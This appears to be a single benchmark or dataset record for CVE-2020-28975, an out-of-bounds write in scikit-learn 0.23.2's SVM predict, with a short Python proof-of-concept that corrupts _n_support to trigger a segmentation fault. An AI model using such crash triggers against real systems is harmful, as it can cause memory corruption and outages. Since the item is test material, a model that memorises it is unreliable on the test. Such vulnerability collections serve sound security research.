@@ -1,0 +1,15 @@
+{
+  "file_id": "99_scikit-learn_issue_18891",
+  "numeric_id": "99",
+  "library_hint": "scikit-learn",
+  "source": "github_issue",
+  "title": "Segmentation fault in SVM predict due to invalid _n_support value",
+  "cve": "CVE-2020-28975",
+  "cwe": "CWE-787: Out-of-bounds Write",
+  "library": "scikit-learn",
+  "affected_version": "== 0.23.2",
+  "vulnerable_function": "svm_predict",
+  "triggerability": "indirect",
+  "trigger_payload": "from sklearn import svm\nfrom sklearn import datasets\nif __name__ == '__main__':\n    X,y = datasets.load_iris(return_X_y=True)\n    clf = svm.SVC()\n    clf.fit(X, y)\n    clf._n_support[0] = 1000000\n    y_pred = clf.predict(X)",
+  "oracle": "Segmentation fault"
+}
